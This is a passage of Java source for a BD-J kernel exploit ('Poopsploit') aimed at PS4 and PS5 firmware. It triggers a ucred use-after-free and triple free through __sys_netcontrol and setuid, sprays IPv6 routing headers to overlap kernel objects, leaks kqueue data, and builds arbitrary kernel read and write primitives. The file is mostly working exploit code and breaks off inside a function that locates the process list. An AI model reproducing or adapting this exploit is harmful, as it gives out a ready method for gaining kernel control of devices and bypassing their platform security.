/*
 * Copyright (C) 2026 Gezine, Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package org.bdj.external;

import org.bdj.api.*;
import org.bdj.Status;

import java.util.*;
import java.io.*;

public class Poops {
    
    private static final String VERSION_STRING = "BD-J Poopsploit 1.2";
    
    private static final int KERNEL_PID = 0;
    
    private static final long SYSCORE_AUTHID = 0x4800000000000007L;
    
    private static final long FIOSETOWN = 0x8004667CL;
    
    private static final int PAGE_SIZE = 0x4000;
    
    private static final int NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
    private static final int NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
    
    private static final int AF_UNIX = 1;
    private static final int AF_INET = 2;
    private static final int AF_INET6 = 28;
    private static final int SOCK_STREAM = 1;
    private static final int SOCK_DGRAM = 2;
    private static final int IPPROTO_IPV6 = 41;
    
    private static final int SO_SNDBUF = 0x1001;
    private static final int SOL_SOCKET   = 0xffff;
    
    private static final int IPV6_RTHDR = 51;
    private static final int IPV6_RTHDR_TYPE_0 = 0;
    
    private static final int RTP_PRIO_REALTIME = 2;
    private static final int RTP_SET = 1;
    
    private static final int UIO_READ = 0;
    private static final int UIO_WRITE = 1;
    private static final int UIO_SYSSPACE = 1;
    
    private static final int CPU_LEVEL_WHICH = 3;
    private static final int CPU_WHICH_TID = 1;
    
    private static final int IOV_SIZE = 0x10;
    private static final int CPU_SET_SIZE = 0x10;
    private static final int PIPEBUF_SIZE = 0x18;
    private static final int MSG_HDR_SIZE = 0x30;
    
    private static final int UCRED_SIZE = 0x168;
    
    private static final int RTHDR_TAG = 0x13370000;
    
    private static final int UIO_IOV_NUM = 0x14;
    private static final int MSG_IOV_NUM = 0x17;
    
    private static final int IPV6_SOCK_NUM = 150;
    private static final int IOV_THREAD_NUM = 4;
    private static final int UIO_THREAD_NUM = 4;
    
    private static final int COMMAND_UIO_READ = 0;
    private static final int COMMAND_UIO_WRITE = 1;    
    
    private static final int MAIN_CORE = 5;

    private static int FILEDESCENT_SIZE;
    private static int KQ_FDP_OFFSET;
    private static int PIPE_SIGIO_OFFSET;
    private static int IN6P_OUTPUTOPTS_OFFSET;
    private static int IP6PO_RHI_RTHDR_OFFSET;
    private static int ROOTVNODE_OFFSET;
    private static int FDT_OFILES_OFFSET;
    private static int P_PID_OFFSET;
    
    private static final API api;
    private static final KernelAPI kapi;
    
    private static long dup;
    private static long close;
    private static long read;
    private static long readv;
    private static long write;
    private static long writev;
    private static long ioctl;
    private static long pipe;
    private static long kqueue;
    private static long socket;
    private static long socketpair;
    private static long recvmsg;
    private static long getsockopt;
    private static long setsockopt;
    private static long setuid;
    private static long getpid;
    private static long sched_yield;
    private static long cpuset_setaffinity;
    private static long rtprio_thread;
    private static long __sys_netcontrol;
    private static long __sys_randomized_path;
    private static long sysctlbyname;
    private static long sceKernelJitCreateSharedMemory;
    private static long mmap;
    private static long __sys_dynlib_get_info2;
    private static long kill;

    private static int[] twins = new int[2];
    private static int[] triplets = new int[3];
    private static int[] ipv6Socks = new int[IPV6_SOCK_NUM];
    
    private static Buffer sprayRthdr = new Buffer(UCRED_SIZE);
    private static int sprayRthdrLen;
    private static Buffer leakRthdr = new Buffer(UCRED_SIZE);
    private static Int32 leakRthdrLen = new Int32();
    
    private static Buffer msg = new Buffer(MSG_HDR_SIZE);
    private static Buffer msgIov = new Buffer(MSG_IOV_NUM * IOV_SIZE);
    private static Buffer uioIovRead = new Buffer(UIO_IOV_NUM * IOV_SIZE);
    private static Buffer uioIovWrite = new Buffer(UIO_IOV_NUM * IOV_SIZE);
    
    private static Int32Array uioSs = new Int32Array(2);
    private static Int32Array iovSs = new Int32Array(2);
    
    private static IovThread[] iovThreads = new IovThread[IOV_THREAD_NUM];
    private static UioThread[] uioThreads = new UioThread[UIO_THREAD_NUM];
    
    private static WorkerState iovState = new WorkerState(IOV_THREAD_NUM);
    private static WorkerState uioState = new WorkerState(UIO_THREAD_NUM);
    
    private static int uioSs0;
    private static int uioSs1;
    
    private static int iovSs0;
    private static int iovSs1;
    
    private static long kl_lock;
    private static long kq_fdp;
    private static long fdt_ofiles;
    private static long curproc;
    private static long allproc;
    private static long bdj_vnode;
    
    private static long kdata_base;

    private static Buffer tmp = new Buffer(PAGE_SIZE);
    
    private static int uafSock;

    public static String PLATFORM   = null;
    public static String FW_VERSION = null;
    public static String NID_PATH = null;
    
    static {
        try {
            api = API.getInstance();
            kapi = KernelAPI.getInstance();
            getPlatform(System.getProperty("http.agent"));
        } catch (Exception e) {
            throw new ExceptionInInitializerError(e);
        }
    }

    private static void getPlatform(String agent) {
        if (agent == null) return;

        int bdjIndex = agent.indexOf(" BD-J ");
        if (bdjIndex == -1) return;

        String prefix = agent.substring(0, bdjIndex);

        int lastSpace = prefix.lastIndexOf(' ');
        if (lastSpace == -1) return;

        String consoleName = prefix.substring(0, lastSpace);
        String generation  = prefix.substring(lastSpace + 1);

        if (!consoleName.equalsIgnoreCase("PlayStation")) return;

        PLATFORM = "PS" + generation;
    }

    private static void getFirmware() {
        Buffer nameBuf = new Buffer(32);
        nameBuf.put(0, "kern.sdk_version\0".getBytes());
        Buffer outBuf = new Buffer(8);
        Buffer sizeBuf = new Buffer(8);
        sizeBuf.putLong(0, 8);
        api.call(sysctlbyname, nameBuf.address(), outBuf.address(), sizeBuf.address(), 0, 0);
        int minor = outBuf.getByte(2) & 0xFF;
        int major = outBuf.getByte(3) & 0xFF;
        String majorStr = Integer.toHexString(major);
        String minorStr = Integer.toHexString(minor);
        if (minorStr.length() == 1) {
            minorStr = "0" + minorStr;
        }
        FW_VERSION = majorStr + "." + minorStr;
        PS4_KernelOffset.FW_VERSION = FW_VERSION;
        PS5_KernelOffset.FW_VERSION = FW_VERSION;
    }

    private static int compareVersions(String v1, String v2) {
        StringTokenizer st1 = new StringTokenizer(v1, ".");
        StringTokenizer st2 = new StringTokenizer(v2, ".");
    
        while (st1.hasMoreTokens() || st2.hasMoreTokens()) {
            int num1 = st1.hasMoreTokens() ? Integer.parseInt(st1.nextToken()) : 0;
            int num2 = st2.hasMoreTokens() ? Integer.parseInt(st2.nextToken()) : 0;
    
            if (num1 != num2) return num1 - num2;
        }
        return 0;
    }
    
    private static boolean setup() {
        dup = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "dup");
        close = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "close");
        read = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "read");
        readv = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "readv");
        write = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "write");
        writev = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "writev");
        ioctl = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "ioctl");
        pipe = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "pipe");
        kqueue = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "kqueue");
        socket = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "socket");
        socketpair = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "socketpair");
        recvmsg = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "recvmsg");
        getsockopt = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "getsockopt");
        setsockopt = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "setsockopt");
        setuid = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "setuid");
        getpid = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "getpid");
        sched_yield = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "sched_yield");
        cpuset_setaffinity = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "cpuset_setaffinity");
        rtprio_thread = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "rtprio_thread");
        __sys_netcontrol = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "__sys_netcontrol");
        __sys_randomized_path = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "__sys_randomized_path");
        sysctlbyname = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "sysctlbyname");
        sceKernelJitCreateSharedMemory = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "sceKernelJitCreateSharedMemory");
        mmap = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "mmap");
        __sys_dynlib_get_info2 = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "__sys_dynlib_get_info2");
        kill = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "kill");
        
        if (dup == 0
                || close == 0
                || read == 0
                || readv == 0
                || write == 0
                || writev == 0
                || ioctl == 0
                || pipe == 0
                || kqueue == 0
                || socket == 0
                || socketpair == 0
                || recvmsg == 0
                || getsockopt == 0
                || setsockopt == 0
                || setuid == 0
                || getpid == 0
                || sched_yield == 0
                || cpuset_setaffinity == 0
                || rtprio_thread == 0
                || __sys_netcontrol == 0
                || __sys_randomized_path == 0
                || sysctlbyname == 0
                || sceKernelJitCreateSharedMemory == 0
                || mmap == 0
                || __sys_dynlib_get_info2 == 0
                || kill == 0) {
            Status.println("Failed to resolve symbols");
            return false;
        }
        
        getFirmware();
        
        Status.info("Console: " + PLATFORM + " " + FW_VERSION);
        
        NID_PATH = "/" + getNidPath() + "/common_temp/bdj.fail";        
        //Status.info("NID path resolved");
        
        if(rerunCheck(NID_PATH)) {
            Status.error("Restart your console to run exploit again, setup failed.");
            return false;
        }
        
        // Thanks cow and ufm42 for PS4/PS5 differences
        if (PLATFORM.equals("PS4")) {
            
            if (compareVersions(FW_VERSION, "9.00") < 0 || compareVersions(FW_VERSION, "13.00") > 0) {
                Status.error("UNSUPPORTED FW_VERSION: " + FW_VERSION);
                return false;
            }

            FILEDESCENT_SIZE = PS4_KernelOffset.FILEDESCENT_SIZE;
            KQ_FDP_OFFSET = PS4_KernelOffset.KQ_FDP_OFFSET;
            PIPE_SIGIO_OFFSET = PS4_KernelOffset.PIPE_SIGIO_OFFSET;
            IN6P_OUTPUTOPTS_OFFSET = PS4_KernelOffset.IN6P_OUTPUTOPTS_OFFSET;
            IP6PO_RHI_RTHDR_OFFSET = PS4_KernelOffset.IP6PO_RHI_RTHDR_OFFSET;
            ROOTVNODE_OFFSET = PS4_KernelOffset.ROOTVNODE_OFFSET;
            FDT_OFILES_OFFSET = PS4_KernelOffset.FDT_OFILES_OFFSET;
            P_PID_OFFSET = PS4_KernelOffset.P_PID_OFFSET;
            
        } else if (PLATFORM.equals("PS5")) {
            
            if (compareVersions(FW_VERSION, "1.00") < 0 || compareVersions(FW_VERSION, "12.00") > 0) {
                Status.error("UNSUPPORTED FW_VERSION: " + FW_VERSION);
                return false;
            }
            
            FILEDESCENT_SIZE = PS5_KernelOffset.FILEDESCENT_SIZE;
            KQ_FDP_OFFSET = PS5_KernelOffset.KQ_FDP_OFFSET;
            PIPE_SIGIO_OFFSET = PS5_KernelOffset.PIPE_SIGIO_OFFSET;
            IN6P_OUTPUTOPTS_OFFSET = PS5_KernelOffset.IN6P_OUTPUTOPTS_OFFSET;
            IP6PO_RHI_RTHDR_OFFSET = PS5_KernelOffset.IP6PO_RHI_RTHDR_OFFSET;
            ROOTVNODE_OFFSET = PS5_KernelOffset.ROOTVNODE_OFFSET;
            FDT_OFILES_OFFSET = PS5_KernelOffset.FDT_OFILES_OFFSET;
            P_PID_OFFSET = PS5_KernelOffset.P_PID_OFFSET;
            
        } else {
            Status.println("UNSUPPORTED PLATFORM : " + PLATFORM);
            return false;
        }

        cpusetSetAffinity(MAIN_CORE);
        rtprioThread(256);
        
        return true;
    }
    
    private static int dup(int fd) {
        return (int) api.call(dup, fd);
    }
    
    private static int close(int fd) {
        return (int) api.call(close, fd);
    }
    
    private static long read(int fd, Buffer buf, long nbytes) {
        return api.call(read, fd, buf != null ? buf.address() : 0, nbytes);
    }
    
    private static long readv(int fd, Buffer iov, int iovcnt) {
        return api.call(readv, fd, iov != null ? iov.address() : 0, iovcnt);
    }
    
    private static long write(int fd, Buffer buf, long nbytes) {
        return api.call(write, fd, buf != null ? buf.address() : 0, nbytes);
    }
    
    private static long writev(int fd, Buffer iov, int iovcnt) {
        return api.call(writev, fd, iov != null ? iov.address() : 0, iovcnt);
    }
    
    private static int ioctl(int fd, long request, long arg0) {
        return (int) api.call(ioctl, fd, request, arg0);
    }
    
    private static int pipe(Int32Array fildes) {
        return (int) api.call(pipe, fildes != null ? fildes.address() : 0);
    }
    
    private static int kqueue() {
        return (int) api.call(kqueue);
    }
    
    private static int socket(int domain, int type, int protocol) {
        return (int) api.call(socket, domain, type, protocol);
    }
    
    private static int socketpair(int domain, int type, int protocol, Int32Array sv) {
        return (int) api.call(socketpair, domain, type, protocol, sv != null ? sv.address() : 0);
    }
    
    private static int recvmsg(int s, Buffer msg, int flags) {
        return (int) api.call(recvmsg, s, msg != null ? msg.address() : 0, flags);
    }
    
    private static int getsockopt(int s, int level, int optname, Buffer optval, Int32 optlen) {
        return (int)
                api.call(
                    getsockopt,
                    s,
                    level,
                    optname,
                    optval != null ? optval.address() : 0,
                    optlen != null ? optlen.address() : 0);
    }
    
    private static int setsockopt(int s, int level, int optname, Buffer optval, int optlen) {
        return (int)
                api.call(setsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen);
    }
    
    private static int setuid(int uid) {
        return (int) api.call(setuid, uid);
    }
    
    private static int getpid() {
        return (int) api.call(getpid);
    }
    
    private static int sched_yield() {
        return (int) api.call(sched_yield);
    }
    
    private static int cpuset_setaffinity(int level, int which, long id, long setsize, Buffer mask) {
        return (int)
                api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
    }
    
    private static int rtprio_thread(int function, int lwpid, long rtp) {
        return (int) api.call(rtprio_thread, function, lwpid, rtp);
    }
    
    private static int __sys_netcontrol(int ifindex, int cmd, Buffer buf, int size) {
        return (int) api.call(__sys_netcontrol, ifindex, cmd, buf != null ? buf.address() : 0, size);
    }

    private static long __sys_randomized_path(int fd, Buffer pathBuf, Int64 lenPtr) {
        return api.call(__sys_randomized_path, fd, pathBuf.address(), lenPtr.address());
    }

    private static int kill_bdj() {
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) { }
        
        return (int) api.call(kill, getpid(), 9);
    }
    
    private static int cpusetSetAffinity(int core) {
        Buffer mask = new Buffer(CPU_SET_SIZE);
        mask.putShort(0x00, (short) (1 << core));
        return cpuset_setaffinity(
                CPU_LEVEL_WHICH, CPU_WHICH_TID, 0xFFFFFFFFFFFFFFFFL, CPU_SET_SIZE, mask);
    }
    
    private static int rtprioThread(int value) {
        Buffer prio = new Buffer(0x4);
        prio.putShort(0x00, (short) RTP_PRIO_REALTIME);
        prio.putShort(0x02, (short) value);
        return rtprio_thread(RTP_SET, 0, prio.address());
    }


    private static int buildRthdr(Buffer buf, int size) {
        int len = ((size >> 3) - 1) & ~1;
        buf.putByte(0x00, (byte) 0); // ip6r_nxt
        buf.putByte(0x01, (byte) len); // ip6r_len
        buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0); // ip6r_type
        buf.putByte(0x03, (byte) (len >> 1)); // ip6r_segleft
        return (len + 1) << 3;
    }

    private static int getRthdr(int s, Buffer buf, Int32 len) {
        return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    }

    private static int setRthdr(int s, Buffer buf, int len) {
        return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    }

    private static int freeRthdr(int s) {
        return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, null, 0);
    }


    static class WorkerState {
        private final int totalWorkers;

        private int workersStartedWork = 0;
        private int workersFinishedWork = 0;

        private int workCommand = -1;

        public WorkerState(int totalWorkers) {
            this.totalWorkers = totalWorkers;
        }

        public synchronized void signalWork(int command) {
            workersStartedWork = 0;
            workersFinishedWork = 0;
            workCommand = command;
            notifyAll();
    
            while (workersStartedWork < totalWorkers) {
                try {
                    wait();
                } catch (InterruptedException e) {
                    // Ignore.
                }
            }
        }

        public synchronized void waitForFinished() {
            while (workersFinishedWork < totalWorkers) {
                try {
                    wait();
                } catch (InterruptedException e) {
                    // Ignore.
                }
            }

            workCommand = -1;
        }

        public synchronized int waitForWork() throws InterruptedException {
            while (workCommand == -1 || workersFinishedWork != 0) {
                wait();
            }

            workersStartedWork++;
            if (workersStartedWork == totalWorkers) {
                notifyAll();
            }

            return workCommand;
        }

        public synchronized void signalFinished() {
            workersFinishedWork++;
            if (workersFinishedWork == totalWorkers) {
                notifyAll();
            }
        }
    }

    static class IovThread extends Thread {
        private final WorkerState state;

        public IovThread(WorkerState state) {
            this.state = state;
        }

        public void run() {
            cpusetSetAffinity(MAIN_CORE);
            rtprioThread(256);

            try {
                while (true) {
                    state.waitForWork();

                    // Allocate iov and block thread.
                    recvmsg(iovSs0, msg, 0);

                    state.signalFinished();
                }
            } catch (InterruptedException e) {
                // Ignore.
            }
        }
    }

    static class UioThread extends Thread {
        private final WorkerState state;

        public UioThread(WorkerState state) {
            this.state = state;
        }

        public void run() {
            cpusetSetAffinity(MAIN_CORE);
            rtprioThread(256);

            try {
                while (true) {
                    int command = state.waitForWork();

                    // Allocate uio and block thread.
                    if (command == COMMAND_UIO_READ) {
                        writev(uioSs1, uioIovRead, UIO_IOV_NUM);
                    } else if (command == COMMAND_UIO_WRITE) {
                        readv(uioSs0, uioIovWrite, UIO_IOV_NUM);
                    }

                    state.signalFinished();
                }
            } catch (InterruptedException e) {
                // Ignore.
            }
        }
    }
    
    private static boolean findTwins() {
        int attempts = 0;
        while (attempts < 5000) {
            for (int i = 0; i < ipv6Socks.length; i++) {
                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
            }

            for (int i = 0; i < ipv6Socks.length; i++) {
                leakRthdrLen.set(Int64.SIZE);
                getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
                int val = leakRthdr.getInt(0x04);
                int j = val & 0xFFFF;
                if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
                    twins[0] = i;
                    twins[1] = j;
                    return true;
                }
            }
            attempts++;
        }
        return false;
    }

    // Thanks cow for optimization
    private static int findTriplet(int master, int other) {
        int attempts = 0;
        while (attempts < 5000) {
            for (int i = 0; i < ipv6Socks.length; i++) {
                if (i == master || i == other) {
                    continue;
                }

                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
            }

            leakRthdrLen.set(Int64.SIZE);
            getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
            int val = leakRthdr.getInt(0x04);
            int j = val & 0xFFFF;
            if ((val & 0xFFFF0000) == RTHDR_TAG && j != master && j != other) {
                return j;
            }
            attempts++;
        }
        return -1;
    }

    private static boolean triggerUcredTripleFree() {
        
        // Prepare spray buffer.
        sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
        
        // Prepare msg iov buffer.
        msg.putLong(0x10, msgIov.address()); // msg_iov
        msg.putLong(0x18, MSG_IOV_NUM); // msg_iovlen
        
        Buffer dummyBuffer = new Buffer(0x1000);
        dummyBuffer.fill((byte) 0x41);
        uioIovRead.putLong(0x00, dummyBuffer.address());
        uioIovWrite.putLong(0x00, dummyBuffer.address());

        // Create socket pair for uio spraying.
        socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
        uioSs0 = uioSs.get(0);
        uioSs1 = uioSs.get(1);
        
        // Create socket pair for iov spraying.
        socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
        iovSs0 = iovSs.get(0);
        iovSs1 = iovSs.get(1);
        
        // Create iov threads.
        for (int i = 0; i < IOV_THREAD_NUM; i++) {
            iovThreads[i] = new IovThread(iovState);
            iovThreads[i].start();
        }
        
        // Create uio threads.
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            uioThreads[i] = new UioThread(uioState);
            uioThreads[i].start();
        }
        
        // Set up sockets for spraying.
        for (int i = 0; i < ipv6Socks.length; i++) {
            ipv6Socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
        }
        
        // Initialize pktopts.
        for (int i = 0; i < ipv6Socks.length; i++) {
            freeRthdr(ipv6Socks[i]);
        }

        Buffer setBuf = new Buffer(8);
        Buffer clearBuf = new Buffer(8);
        
        // Prepare msg iov spray. Set 1 as iov_base as it will be interpreted as cr_refcnt.
        msgIov.putLong(0x00, 1); // iov_base
        msgIov.putLong(0x08, Int8.SIZE); // iov_len
        
        // Create dummy socket to be registered and then closed.
        int dummySock = socket(AF_UNIX, SOCK_STREAM, 0);
        
        // Register dummy socket.
        setBuf.putInt(0x00, dummySock);
        __sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());
        
        // Close the dummy socket.
        close(dummySock);
        
        // Allocate a new ucred.
        setuid(1);
        
        // Reclaim the file descriptor.
        uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
        
        // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
        setuid(1);
        
        // Unregister dummy socket and free the file and ucred.
        clearBuf.putInt(0x00, uafSock);
        __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
        
        // Set cr_refcnt back to 1.
        for (int i = 0; i < 32; i++) {
            // Reclaim with iov.
            iovState.signalWork(0);
            sched_yield();

            // Release buffers.
            write(iovSs1, tmp, Int8.SIZE);
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        }

        // Double free ucred.
        // Note: Only dup works because it does not check f_hold.
        close(dup(uafSock));
        
        Status.info("Searching for triplets...");
        
        // Find twins.
        if(!findTwins()) {
            Status.println("Twins not found");
            return false;
        }
        
        // Status.println("Twins found : " + String.valueOf(twins[0]) + ", " + String.valueOf(twins[1]));

        // Status.println("Finding triplets...");
        // Free one.
        freeRthdr(ipv6Socks[twins[1]]);

        // Set cr_refcnt back to 1.
        while (true) {
            // Reclaim with iov.
            iovState.signalWork(0);
            sched_yield();

            leakRthdrLen.set(Int64.SIZE);
            getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);

            if (leakRthdr.getInt(0x00) == 1) {
                break;
            }

            // Release iov spray.
            write(iovSs1, tmp, Int8.SIZE);
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        }
        
        triplets[0] = twins[0];

        // Triple free ucred.
        close(dup(uafSock));

        // Find triplet.
        int triplet_ret = findTriplet(triplets[0], -1);
        if (triplet_ret < 0 ) {
            Status.println("Triplets not found");
            return false;
        }
        triplets[1] = triplet_ret;

        // Release iov spray.
        write(iovSs1, tmp, Int8.SIZE);

        // Find triplet.
        triplet_ret = findTriplet(triplets[0], triplets[1]);
        if (triplet_ret < 0) {
            Status.println("Triplets not found");
            return false;
        }
        triplets[2] = triplet_ret;

        iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);
        
        Status.info("Twins and triplets found");
        
        return true;
    }


    private static boolean leakKqueue() {
        // Status.println("Leaking kqueue...");

        // Free one.
        freeRthdr(ipv6Socks[triplets[1]]);

        // Leak kqueue.
        int attempts = 0;
        int kq = 0;
        while (attempts < 50000) {
            kq = kqueue();

            // Leak with other rthdr.
            leakRthdrLen.set(0x100);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

            if (leakRthdr.getLong(0x08) == 0x1430000 && leakRthdr.getLong(KQ_FDP_OFFSET) != 0) {
                break;
            }

            close(kq);
            sched_yield();
            attempts++;
        }
        
        kl_lock = leakRthdr.getLong(0x60);
        kq_fdp = leakRthdr.getLong(KQ_FDP_OFFSET);
        
        if (kq_fdp == 0) {
            return false;
        }
        // Status.println("kq_fdp: " + Long.toHexString(kq_fdp));

        // Close kqueue to free buffer.
        close(kq);

        // Find triplet.
        int triplet_ret = findTriplet(triplets[0], triplets[2]);
        if (triplet_ret < 0) {
            Status.println("Triplets not found");
            return false;
        }
        triplets[1] = triplet_ret;
        return true;
    }

    private static void buildUio(Buffer uio, long uio_iov, long uio_td, boolean read, long addr, long size) {
        uio.putLong(0x00, uio_iov); // uio_iov
        uio.putLong(0x08, UIO_IOV_NUM); // uio_iovcnt
        uio.putLong(0x10, 0xFFFFFFFFFFFFFFFFL); // uio_offset
        uio.putLong(0x18, size); // uio_resid
        uio.putInt(0x20, UIO_SYSSPACE); // uio_segflg
        uio.putInt(0x24, read ? UIO_WRITE : UIO_READ); // uio_segflg
        uio.putLong(0x28, uio_td); // uio_td
        uio.putLong(0x30, addr); // iov_base
        uio.putLong(0x38, size); // iov_len
    }

    private static Buffer kreadSlow(long addr, int size) {
        // Prepare leak buffers.
        Buffer[] leakBuffers = new Buffer[UIO_THREAD_NUM];
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            leakBuffers[i] = new Buffer(size);
        }

        // Set send buf size.
        Int32 bufSize = new Int32(size);
        setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());

        // Fill queue.
        write(uioSs1, tmp, size);

        // Set iov length
        uioIovRead.putLong(0x08, size);

        // Free one.
        freeRthdr(ipv6Socks[triplets[1]]);

        // Reclaim with uio.
        while (true) {
            uioState.signalWork(COMMAND_UIO_READ);
            sched_yield();

            // Leak with other rthdr.
            leakRthdrLen.set(0x10);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

            if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
                break;
            }

            // Wake up all threads.
            read(uioSs0, tmp, size);

            for (int i = 0; i < UIO_THREAD_NUM; i++) {
                read(uioSs0, leakBuffers[i], leakBuffers[i].size());
            }

            uioState.waitForFinished();

            // Fill queue.
            write(uioSs1, tmp, size);
        }

        long uio_iov = leakRthdr.getLong(0x00);

        // Prepare uio reclaim buffer.
        buildUio(msgIov, uio_iov, 0, true, addr, size);

        // Free second one.
        freeRthdr(ipv6Socks[triplets[2]]);

        // Reclaim uio with iov.
        while (true) {
            // Reclaim with iov.
            iovState.signalWork(0);
            sched_yield();

            // Leak with other rthdr.
            leakRthdrLen.set(0x40);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

            if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
                break;
            }

            // Release iov spray.
            write(iovSs1, tmp, Int8.SIZE);
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        }

        // Wake up all threads.
        read(uioSs0, tmp, size);

        // Read the results now.
        Buffer leakBuffer = null;

        // Get leak.
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            read(uioSs0, leakBuffers[i], leakBuffers[i].size());

            if (leakBuffers[i].getLong(0x00) != 0x4141414141414141L) {
                // Find triplet.
                triplets[1] = findTriplet(triplets[0], -1);

                leakBuffer = leakBuffers[i];
            }
        }

        uioState.waitForFinished();

        // Release iov spray.
        write(iovSs1, tmp, Int8.SIZE);

        // Find triplet.
        triplets[2] = findTriplet(triplets[0], triplets[1]);

        iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);

        return leakBuffer;
    }

    private static void kwriteSlow(long addr, Buffer buffer) {
        // Set send buf size.
        Int32 bufSize = new Int32(buffer.size());
        setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());

        // Set iov length.
        uioIovWrite.putLong(0x08, buffer.size());

        // Free first triplet.
        freeRthdr(ipv6Socks[triplets[1]]);

        // Reclaim with uio.
        while (true) {
            uioState.signalWork(COMMAND_UIO_WRITE);
            sched_yield();

            // Leak with other rthdr.
            leakRthdrLen.set(0x10);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

            if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
                break;
            }

            // Wake up all threads.
            for (int i = 0; i < UIO_THREAD_NUM; i++) {
                write(uioSs1, buffer, buffer.size());
            }

            uioState.waitForFinished();
        }

        long uio_iov = leakRthdr.getLong(0x00);

        // Prepare uio reclaim buffer.
        buildUio(msgIov, uio_iov, 0, false, addr, buffer.size());

        // Free second one.
        freeRthdr(ipv6Socks[triplets[2]]);

        // Reclaim uio with iov.
        while (true) {
            // Reclaim with iov.
            iovState.signalWork(0);
            sched_yield();

            // Leak with other rthdr.
            leakRthdrLen.set(0x40);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

            if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
                break;
            }

            // Release iov spray.
            write(iovSs1, tmp, Int8.SIZE);
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        }

        // Corrupt data.
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            write(uioSs1, buffer, buffer.size());
        }

        // Find triplet.
        triplets[1] = findTriplet(triplets[0], -1);

        uioState.waitForFinished();

        // Release iov spray.
        write(iovSs1, tmp, Int8.SIZE);

        // Find triplet.
        triplets[2] = findTriplet(triplets[0], triplets[1]);

        iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);
    }

    private static long kreadSlow64(long address) {
        return kreadSlow(address, Int64.SIZE).getLong(0x00);
    }

    private static long fget(int fd) {
        return kapi.kread64(fdt_ofiles + fd * FILEDESCENT_SIZE);
    }

    private static long findAllProc() {
        Int32Array pipeFd = new Int32Array(2);
        pipe(pipeFd);

        Int32 currPid = new Int32();
        currPid.set(getpid());
        ioctl(pipeFd.get(0), FIOSETOWN, currPid.address());

        long fp = fget(pipeFd.get(0));
        long f_data = kapi.kread64(fp + 0x00);
        long pipe_sigio = kapi.kread64(f_data + PIPE_SIGIO_OFFSET);
        curproc = kapi.kread64(pipe_sigio);
        long p = curproc;

